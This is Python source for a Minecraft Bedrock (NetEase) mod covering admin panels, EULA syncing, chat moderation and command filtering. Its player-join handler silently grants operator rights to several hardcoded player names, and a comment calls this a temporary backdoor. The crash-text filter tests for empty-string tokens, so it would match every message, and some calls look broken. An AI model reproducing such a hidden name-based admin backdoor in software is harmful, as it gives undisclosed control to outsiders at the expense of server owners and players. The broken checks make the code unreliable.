# -*- coding: utf-8 -*-
from __future__ import print_function
from Preset.Model.PartBase import PartBase
from Preset.Model.GameObject import registerGenericClass
import mod.server.extraServerApi as serverApi
import mod.client.extraClientApi as clientApi
import json
import time
import math

CFServer = serverApi.GetEngineCompFactory()
CFClient = clientApi.GetEngineCompFactory()
levelId = serverApi.GetLevelId()
compCmd = CFServer.CreateCommand(levelId)
compGame = CFServer.CreateGame(levelId)
compExtra = CFServer.CreateExtraData(levelId)
compHttp = CFServer.CreateHttp(levelId)


def unicode_convert(input):
	#type: (dict|str) -> dict|list|str|bool
	if isinstance(input, dict):
		return {unicode_convert(key): unicode_convert(value) for key, value in input.iteritems()}
	elif isinstance(input, list):
		return [unicode_convert(element) for element in input]
	elif isinstance(input, unicode): # type: ignore
		output = input.encode('utf-8')
		if output == 'True':
			return True
		elif output == 'False':
			return False
		else:
			return output
	else:
		return input

def conver_to_nbt(input):
	#if isinstance(input, str):
	#	return {'__type__':8, '__value__':input}
	if isinstance(input, list):
		return [conver_to_nbt(element) for element in input]
	#elif input in [0, 1]:
	#	return {'__type__':1, '__value__':input}
	#elif isinstance(input, int):
	#	return {'__type__':3, '__value__':input}
	#elif isinstance(input, float):
	#	return {'__type__':5, '__value__':input}
	elif isinstance(input, dict):
		if input.get('__type__', None) is not None:
			if input['__type__'] == 4: 
				return {'__type__':4, '__value__': (input['__value__'])}
			return input
		else:
			return {key: conver_to_nbt(value) for key, value in input.items()}

def intg(num):
	#type: (float) -> int
	return int(math.floor(num))

@registerGenericClass("MainLogicPart")
class MainLogicPart(PartBase):
	
	def __init__(self):
		PartBase.__init__(self)
		# 零件名称
		self.name = "主逻辑零件"
		self.etsFiles = []
		self.last_operation_cache = {}  # 缓存操作员状态
		self.last_message_time = {} # 初始化发言限频字典

	def InitClient(self):
		"""
		@description 客户端的零件对象初始化入口
		"""
		PartBase.InitClient(self)
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI", self, self.UI)
		clientsystem.ListenForEvent('Minecraft', 'preset', 'close', self, self.close)
		clientsystem.ListenForEvent(clientApi.GetEngineNamespace(), clientApi.GetEngineSystemName(),'OnLocalPlayerStopLoading', self, self.OnFinish)

	def OnFinish(self, args):
		clientApi.GetSystem("Minecraft", "preset").NotifyToServer('TryOpenEULA', {})

	def TryOpenEULA(self, args):
		playerId = args['__id__']
		playerUid = compHttp.GetPlayerUid(playerId)
		
		def checkEULAgreed_callback(EULAdata):
			compPlayerExtraData = CFServer.CreateExtraData(playerId)
			if EULAdata is None:
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "在与云服务器同步EULA状态时出现了一个错误。", "§c")
				if compPlayerExtraData.GetExtraData('EULA'):
					return
				else:
					serversystem.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})
					return	
			
			# 同步到本地
			cloud_data = {item["key"]: item["value"] for item in EULAdata["entity"]["data"]}
			cloud_agreed = cloud_data.get("EULA_Agreed", False)
			compPlayerExtraData.SetExtraData('EULA', cloud_agreed)
			
			if not cloud_agreed:
				serversystem.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})

		compHttp.LobbyGetStorage(checkEULAgreed_callback, playerUid, ["EULA_Agreed"])

		# compExtra = CFServer.CreateExtraData(playerId)
		
		# if not compExtra.GetExtraData('EULA'):
		# 	serversystem.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})

	def UI(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName(args["ui"])[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)
		
	def close(self, args): #不用popTopUi()，防止原生页面被额外关闭
		for i in ["enchant","getitem","nbteditor","itemTips","cmdbatch","cmdblockimportui","struimport"]:
			uiNodePreset = self.GetParent().GetChildPresetsByName(i)[0]
			uiNodePreset.SetUiActive(False)
			uiNodePreset.SetUiVisible(False)

	def enchant(self, enchantdata):
		if CFServer.CreatePlayer(enchantdata["__id__"]).GetPlayerOperation() == 2:
			# 二次权限验证
			compItem = CFServer.CreateItem(enchantdata["__id__"])
			itemDict = compItem.GetPlayerItem(2, 0, True)
			if itemDict:
				if itemDict["userData"] is None:
					itemDict["userData"] = {}
				if itemDict["userData"].get('ench', None) is None:
					itemDict["userData"]['ench'] = []
				if enchantdata["id"] == "del":
					itemDict["userData"]['ench'].pop(0)
				else:
					itemDict["userData"]['ench'].insert(0, {'lvl': {'__type__': 2, '__value__': int(enchantdata["lvl"])}, 'id': {'__type__': 2, '__value__': int(enchantdata["id"])}, 'modEnchant': {'__type__': 8, '__value__': ''}})
				itemDict["enchantData"] = []
				compItem.SpawnItemToPlayerCarried(itemDict, enchantdata["__id__"])

	def getitem(self, itemdata):
		if CFServer.CreatePlayer(itemdata["__id__"]).GetPlayerOperation() == 2:
			CFServer.CreateItem(itemdata["__id__"]).SpawnItemToPlayerInv(itemdata, itemdata["__id__"])

	def loadstructure(self, data):
		playerid = data["__id__"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			playerpos = CFServer.CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			player_X = intg(player_X)
			player_Y = int(player_Y)
			player_Z = intg(player_Z)
			structure = data["structuredata"]
			block_palette = structure['structure']['palette']['default']['block_palette']
			block_entity_data = conver_to_nbt(structure['structure']['palette']['default']['block_position_data'])
			serversystem = serverApi.GetSystem("Minecraft", "preset")
			blockEntitycomp = CFServer.CreateBlockInfo(levelId)
			blockcomp = CFServer.CreateBlockInfo(levelId)
			blockStateComp = CFServer.CreateBlockState(levelId)
			i = 0
			for x in range(structure["size"][0]):
				for y in range(structure['size'][1]):
					for z in range(structure['size'][2]):
						if structure['structure']['block_indices'][0][i] != -1:
							blockcomp.SetBlockNew((player_X+x, player_Y+y,player_Z+z),
							 					{'name':block_palette[structure['structure']['block_indices'][0][i]]['name'], 
			  									'aux':0}, 
												0, 
												data['dimension'], 
												True, 
												False)
							blockStateComp.SetBlockStates((player_X+x, player_Y+y,player_Z+z),block_palette[structure['structure']['block_indices'][0][i]]['states'], data['dimension'])
							if block_entity_data.has_key(str(i)) and block_entity_data[str(i)].has_key('block_entity_data'):
								#print(block_entity_data[str(i)]['block_entity_data'])
								blockEntitycomp.SetBlockEntityData(data['dimension'], (player_X+x, player_Y+y,player_Z+z), (block_entity_data[str(i)]['block_entity_data']))
							pass
						i += 1
			for i in structure['structure']['entities']:
				x, y, z = i['Pos']
				x = x['__value__']
				y = y['__value__']
				z = z['__value__']
				x -= structure['structure_world_origin'][0]
				y -= structure['structure_world_origin'][1]
				z -= structure['structure_world_origin'][2]
				x += player_X
				y += player_Y
				z += player_Z
				print((x, y, z))
				print(serversystem.CreateEngineEntityByNBT(i, (x, y, z), None, data['dimension']))


	def InitServer(self):
		global serversystem
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "ServerChatEvent", self, self.OnServerChat)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "CommandEvent", self, self.OnCommandEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "PlayerJoinMessageEvent", self, self.OnAddPlayerEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "PlayerLeftMessageServerEvent", self, self.OnRemovePlayerEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "ClientLoadAddonsFinishServerEvent", self, self.OnClientLoadAddonsFinishServerEvent)
		serversystem.ListenForEvent('Minecraft', 'preset', "enchant", self, self.enchant)
		serversystem.ListenForEvent('Minecraft', 'preset', "getitem", self, self.getitem)
		serversystem.ListenForEvent('Minecraft', 'preset', "changeTip", self, self.changeTips)
		serversystem.ListenForEvent('Minecraft', 'preset', "changenbt", self, self.changenbt)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdbatch', self, self.cmdbatch)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdblockimport', self, self.cmdblockimport)
		serversystem.ListenForEvent('Minecraft', 'preset', 'loadstructure', self, self.loadstructure)
		serversystem.ListenForEvent('Minecraft', 'preset', 'TryOpenEULA', self, self.TryOpenEULA)
		serversystem.ListenForEvent('Minecraft', 'preset', 'EULA', self, self.eula)
		compCmd.SetCommandPermissionLevel(4)
		self.timer = CFServer.CreateGame(serverApi.GetLevelId).AddRepeatedTimer(1.0, self.OnSecond)
		CFServer.CreatePet(levelId).Disable() 

		"""
		@description 服务端的零件对象初始化入口
		"""

		PartBase.InitServer(self)

	def eula(self, args):
		playerId = args['__id__']
		if args["reason"] == "EULA_FAILED_ERROR":
			compCmd.SetCommand('/kick %s %s' % (CFServer.CreateName(playerId).GetName(), "您没有接受EULA协议"), False)
		elif args["reason"] == "EULA_AGREED":
			compMsg = CFServer.CreateMsg(playerId)
			playerUid = compHttp.GetPlayerUid(playerId)
			def callback(result):
				if result is None:
					compMsg.NotifyOneMessage(playerId, "在与云服务器同步EULA状态时出现了一个错误。", "§c")
					compMsg.NotifyOneMessage(playerId, "感谢您接受EULA协议！", "§a")
					CFServer.CreateExtraData(playerId).SetExtraData('EULA', True)
					return
				else:
					compMsg.NotifyOneMessage(playerId, "感谢您接受EULA协议！EULA状态已同步至云服务器。", "§a")
					CFServer.CreateExtraData(playerId).SetExtraData('EULA', True)
			def entities_getter():
				return [{
					"key": "EULA_Agreed",
					"value": True
				}]
			compHttp.LobbySetStorageAndUserItem(callback, playerUid, None, entities_getter)
		else:
			compCmd.SetCommand('/kick %s %s' % (CFServer.CreateName(playerId).GetName(), "发生了未知错误，请联系开发者"), False)
			


	def changenbt(self, args):
		if CFServer.CreatePlayer(args["__id__"]).GetPlayerOperation() == 2:
			CFServer.CreateItem(args["__id__"]).SpawnItemToPlayerCarried(args["nbt"], args["__id__"])
	
	def cmdbatch(self, cmds):
		playerid = cmds["__id__"]
		cmd = cmds["cmds"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			cmd = cmd.split("\n")
			playername = CFServer.CreateName(playerid).GetName()
			for i in cmd:
				compCmd.SetCommand('/execute as "'+ playername +'" at @s run ' + i, True)
		
	def changeTips(self, tips):
		if CFServer.CreatePlayer(tips["__id__"]).GetPlayerOperation() == 2:
			itemComp = CFServer.CreateItem(tips["__id__"])
			itemDict = itemComp.GetEntityItem(2, 0, True)
			if tips["Tips"] == '':
				del itemDict['userData']['ItemCustomTips']
			itemDict['customTips'] = tips["Tips"]
			itemComp.SpawnItemToPlayerCarried(itemDict, tips["__id__"])

	def cmdblockimport(self, cmdblockcmdsjson):
		playerid = cmdblockcmdsjson["__id__"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			playerpos = CFServer.CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			data = json.loads(cmdblockcmdsjson["cmdblockcmdsjson"])
			blockEntitycomp = serverApi.GetEngineCompFactory().CreateBlockInfo(levelId)
			for block in data:
				
				cmd = block["Command"].encode("utf-8")
				name = block["CustomName"].encode("utf-8")
				x = int(block["x"] + intg(player_X))
				y = int(block["y"] + int(player_Y))
				z = int(block["z"] + intg(player_Z))
				delay = int(block["Delay"])
				print("delay:", delay)
				dimensionId = cmdblockcmdsjson["dimension"]
				redstone_mode_mapping = {0: 1, 1: 0}
				redstoneMode = redstone_mode_mapping.get(block["isAuto"], None)
				compBlockEntity = CFServer.CreateBlockEntity(levelId)
				cmdblkdata = compBlockEntity.GetCommandBlock((x, y, z), dimensionId)
				mode = int(cmdblkdata["mode"])
				isConditional = int(cmdblkdata["isConditional"])
				
				# 设置命令方块的延迟，通过网易接口设置后返回True，但实际上并没有设置成功

				# blockEntityData = blockEntitycomp.GetBlockEntityData(dimensionId, (x,y,z))
				# if blockEntityData:
				# 	blockEntityData['TickDelay']['__value__'] = delay
				# 	blockEntitycomp.SetBlockEntityData(dimensionId, (x,y,z), blockEntityData)
				
				compBlockEntity.SetCommandBlock((x, y, z), dimensionId, cmd, name, mode, isConditional, redstoneMode)

	def OnServerChat(self, args):
		
		def check_time_limit(playerId,current_time):
			# 管理员无限制
			if CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2:
				return True
			
			limitFrequency = compExtra.GetExtraData("limitFrequency") if compExtra.GetExtraData("limitFrequency") else 0 # 如未定义，默认为0，即无限制
			if (limitFrequency - 0) < 0.01: # 处理浮点数误差 
				return True
			elif playerId in self.last_message_time:
				last_time = self.last_message_time[playerId]
				time_elapsed = current_time - last_time
				if time_elapsed < limitFrequency:
					compMsg = CFServer.CreateMsg(playerId)
					compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§e您发送消息过于频繁，请等待 %.1f 秒后再试" % (limitFrequency - time_elapsed))
					return False # 未超过限定时间
				else:
					return True # 超过限定时间，允许发言
			else:
				return True # 从未发言的玩家，允许发言

		playerId = args["playerId"]
		message = args["message"]
		username = args["username"]
		args["cancel"] = True
		CFServer.CreateEntityComponent(playerId).GetEntitiesBySelector

		if CFServer.CreateExtraData(playerId).GetExtraData("mute"):
			compMsg = CFServer.CreateMsg(playerId)
			compMsg.NotifyOneMessage(playerId, "您无法在被禁言状态下发送消息，请联系房间管理解除禁言。", "§e")
			return
		
		
		for token in ("", "", ""):
			if token in message:
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§c检测到您试图发送崩服文本，系统已将您禁言！请联系房间管理解除禁言", "§c")
				compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§e检测到玩家§c【%s】§r§e试图发送崩服文本，系统已将其禁言。若需解除禁言，请使用§a/mute§e命令"}]}' % username)
				CFServer.CreateExtraData(playerId).SetExtraData("mute", True)
				return
			
		commands = {
			"python.enchant": ("自定义附魔面板", "enchant"),
			"python.getitem": ("获取隐藏物品面板", "getitem"),
			"python.nbteditor": ("NBT修改器", "nbteditor"),
			"python.changetips": ("修改物品注释面板", "itemTips"),
			"python.cmdbatch": ("批量执行命令面板", "cmdbatch"),
			"python.cmdblockimport": ("命令方块设置工具面板", "cmdblockimportui"),
			"python.structureimport": ("导入结构面板", "struimport")
		}

		if message in commands:
			desc, ui_name = commands[message]
			can_use_key = (CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2)
			if can_use_key:
				compMsg = CFServer.CreateMsg(playerId)
				serversystem.NotifyToClient(playerId, "openUI", {"ui": ui_name})
				compMsg.NotifyOneMessage(playerId, "[警告] 通过此命令打开管理面板的方式将在未来的版本中被移除，建议使用命令 /openui 代替。", "§e")
			else:
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限。", "§c")
			return

		if message == "python.gettps":
			can_use_key = (CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2)
			if can_use_key:
				tick_time = serverApi.GetServerTickTime()
				TPS = "20.0*" if tick_time <= 50 else "%.1f" % (1000 / tick_time)
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "TPS:%s mspt:%.2fms" % (TPS,tick_time), "§e")
				compMsg.NotifyOneMessage(playerId, "[警告] 通过此命令获取TPS的方式将在未来的版本中被移除，建议使用命令 /gettps 代替。", "§e")
			else:
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限。", "§c")
			return
		
		# 普通消息
		current_time = time.time()
		if check_time_limit(playerId,current_time):
			compdata = CFServer.CreateExtraData(playerId)
			chatprefix = compdata.GetExtraData("chatprefix") if compdata.GetExtraData("chatprefix") else ""
			sanitized_msg = message if compGame.CheckWordsValid(message) else "***"
			compGame.SetNotifyMsg("%s%s >>> %s" % (chatprefix, username, sanitized_msg))
			self.last_message_time[playerId] = current_time

		# 注意：使用setnotifymsg会被视为系统消息而非玩家消息，无法使用“静音玩家聊天”屏蔽

		# 旧版，使用tellraw，遇到引号会报错
		# message = message.replace('\\', '\\\\')
		# compCmd.SetCommand('/tellraw @a {\"rawtext\":[{\"text\":\"%s%s >>> §r%s\"}]}' % (chatprefix, args['username'], message.replace('"', '\\"')))

	def OnCommandEvent(self, args):
		compMsg = CFServer.CreateMsg(args["entityId"])
		cmd = args["command"].strip().lower()
		entityId = args["entityId"]
		if cmd.startswith("/kill @e"):
			# 检查命令的剩余部分是否只有空格（忽略首尾空格）
			if not cmd[9:].strip():
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, '命令 /kill @e 已在本地图被禁止。', "§c")
				return
		
		if any(cmd.startswith(prefix) for prefix in ("/msg", "/me", "/tell","/w")):
			allow_msg = compExtra.GetExtraData("allow_msg")
			if not allow_msg and CFServer.CreatePlayer(entityId).GetPlayerOperation() != 2:
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, "§r§e§l[MSGWatcher] §r§c当前房间禁止私聊消息。", "§c")
				return
			ifmute = CFServer.CreateExtraData(entityId).GetExtraData("mute")
			if ifmute:
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, 
										"您无法在被禁言状态下发送消息，请联系房间管理解除禁言。", 
										"§e")
				return
			def check_time_limit(playerId,current_time):
				# 管理员无限制
				if CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2:
					return True
				
				limitFrequency = compExtra.GetExtraData("limitFrequency") if compExtra.GetExtraData("limitFrequency") else 0 # 如未定义，默认为0，即无限制
				if (limitFrequency - 0) < 0.01: # 处理浮点数误差 
					return True
				elif playerId in self.last_message_time:
					last_time = self.last_message_time[playerId]
					time_elapsed = current_time - last_time
					if time_elapsed < limitFrequency:
						compMsg = CFServer.CreateMsg(playerId)
						compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§e您发送消息过于频繁，请等待 %.1f 秒后再试" % (limitFrequency - time_elapsed))
						return False # 未超过限定时间
					else:
						return True # 超过限定时间，允许发言
				else:
					return True # 从未发言的玩家，允许发言
			current_time = time.time()
			if check_time_limit(entityId,current_time):
				self.last_message_time[entityId] = current_time # 更新最后发言时间
			else:
				args["cancel"] = True
				return


	def OnAddPlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "渡鸦哥与陌生人":
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		# 临时后门，仅用于调试

	def OnClientLoadAddonsFinishServerEvent(self, args):
		playername = CFServer.CreateName(args["playerId"]).GetName()
		
		# 禁用魔法指令功能
		CFServer.CreateAiCommand(args["playerId"]).Disable()
		
		if not compGame.CheckWordsValid(playername):
			CFServer.CreatePlayer(args["playerId"]).SetPermissionLevel(0)
			CFServer.CreateMsg(args["playerId"]).NotifyOneMessage(args["playerId"], "§6§l管理小助手>>> §r§c检测到您的名字中含有违禁词，已将您设为游客权限。")
			compCmd.SetCommand('/tellraw @a {"rawtext":[{"text":"§6§l房间公告>>> §r§e检测到名字含有违禁词的玩家加入了游戏，已将其设为游客权限!"}]}',False)
			compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§b可使用§a@a[tag=banname]§b选中违禁词玩家!"}]}',False)
			CFServer.CreateTag(args["playerId"]).AddEntityTag("banname")
	
	def OnRemovePlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 离开了游戏"
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 离开了游戏"
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 离开了游戏"

	def TickClient(self):
		"""
		@description 客户端的零件对象逻辑驱动入口
		"""
		PartBase.TickClient(self)

	def TickServer(self):
		"""
		@description 服务端的零件对象逻辑驱动入口
		"""
		PartBase.TickServer(self)

	def OnSecond(self):
		# 轮询性能消耗较大，但我们不得不使用，因为网易并未给出权限事件触发的接口
		# 目前的做法是每秒轮询一次，获取所有玩家的权限，并设置权限
		playerIds = serverApi.GetPlayerList()
		for player in playerIds:

			current_op = CFServer.CreatePlayer(player).GetPlayerOperation()
			
			# 旧 master 指令现已弃用，玩家需改用命令方块内/console "/op"命令设置权限
			# if CFServer.CreateExtraData(player).GetExtraData("isMaster"):
			# 	CFServer.CreatePlayer(player).SetPermissionLevel(2)		
			
			if (self.last_operation_cache.get(player) != current_op):
				
				playername = CFServer.CreateName(player).GetName()

				if current_op == 2:
					compCmd.SetCommand('/tellraw @a[name=%s,tag=!op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§a您已获得管理员权限。"}]}' % (playername))
					CFServer.CreateTag(player).AddEntityTag("op")
				else:
					compCmd.SetCommand('/tellraw @a[name=%s,tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§c您的管理员权限已被撤销。"}]}' % (playername))
					CFServer.CreateTag(player).RemoveEntityTag("op")
				
				self.last_operation_cache[player] = current_op # 更新缓存

	def DestroyClient(self):
		"""
		@description 客户端的零件对象销毁逻辑入口
		"""
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.UnListenAllEvents()
		PartBase.DestroyClient(self)

	def DestroyServer(self):
		"""
		@description 服务端的零件对象销毁逻辑入口
		"""
		CFServer.CreateGame(serverApi.GetLevelId).CancelTimer(self.timer)
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		serversystem.UnListenAllEvents()
		PartBase.DestroyServer(self)